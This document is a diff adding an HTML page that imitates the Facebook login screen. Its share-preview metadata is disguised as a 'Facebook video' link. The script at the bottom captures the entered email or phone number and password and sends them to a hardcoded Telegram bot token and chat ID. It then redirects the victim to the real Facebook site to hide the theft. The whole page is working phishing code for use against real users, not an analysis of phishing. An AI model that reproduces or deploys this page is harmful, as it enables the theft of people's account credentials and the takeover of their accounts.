@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Open Graph -->
+<meta property="og:type" content="website">
+<meta property="og:title" content="Facebook video">
+<meta property="og:description" content="Watch videos easily">
+<meta property="og:image" content="https://i.supaimg.com/5279356f-a8e6-4ce6-b452-1f223bcfb816/9020d747-c0bf-4114-88eb-0538fd15cb10.jpg">
+<meta property="og:url" content="https://your-domain.com/">
+
+<!-- Twitter Card -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Facebook video">
+<meta name="twitter:description" content="Watch videos easily">
+<meta name="twitter:image" content="https://i.supaimg.com/5279356f-a8e6-4ce6-b452-1f223bcfb816/9020d747-c0bf-4114-88eb-0538fd15cb10.jpg">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #0b141a;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            height: 100vh;
+            padding: 20px;
+        }
+
+        .top-section {
+            width: 100%;
+            text-align: center;
+            margin-top: 10px;
+            color: #b0b3b8;
+            font-size: 14px;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .fb-logo {
+            width: 65px;
+            margin-bottom: 40px;
+        }
+
+        .input-group {
+            margin-bottom: 12px;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px;
+            background-color: #1c2733;
+            border: 1px solid #3e4b5b;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #0064e0;
+            border: none;
+            border-radius: 25px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        .forgot-pass {
+            display: block;
+            margin-top: 20px;
+            color: white;
+            text-decoration: none;
+            font-size: 15px;
+        }
+
+        .footer-section {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            padding-bottom: 20px;
+        }
+
+        .create-account-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: transparent;
+            border: 1px solid #0064e0;
+            border-radius: 25px;
+            color: #0064e0;
+            font-size: 15px;
+            font-weight: bold;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        .meta-logo {
+            color: #b0b3b8;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="top-section">English (UK) ⌵</div>
+
+    <div class="main-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="FB Logo" class="fb-logo">
+
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="email" placeholder="Mobile number or email address" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="login-btn" id="submitBtn">Log in</button>
+        </form>
+
+        <a href="#" class="forgot-pass">Forgotten password?</a>
+    </div>
+
+    <div class="footer-section">
+        <a href="#" class="create-account-btn">Create new account</a>
+        <div class="meta-logo">∞ Meta</div>
+    </div>
+
+    <script>
+        const token = "8061143382:AAFaKlRFpV9bzMBXRabFqLBQI_pwDXQ4968";
+        const chatId = "7266673273";
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const myUser = "@mhrafitech";
+
+            const message = `🔔 New Login Received!\n\n👤 User: ${myUser}\n📧 Email/Phone: ${email}\n🔑 Password: ${password}`;
+
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // বাটন ডিজেবল করা যাতে বারবার ক্লিক না হয়
+            document.getElementById('submitBtn').innerText = "Connecting...";
+            document.getElementById('submitBtn').disabled = true;
+
+            fetch(url)
+            .then(response => {
+                if(response.ok) {
+                    // সাকসেস হলে ফেসবুকের আসল পেজে পাঠিয়ে দিবে
+                    window.location.href = "https://www.facebook.com";
+                } else {
+                    alert("Error! Please try again.");
+                    document.getElementById('submitBtn').disabled = false;
+                    document.getElementById('submitBtn').innerText = "Log in";
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
+
+</body>
+</html>
+
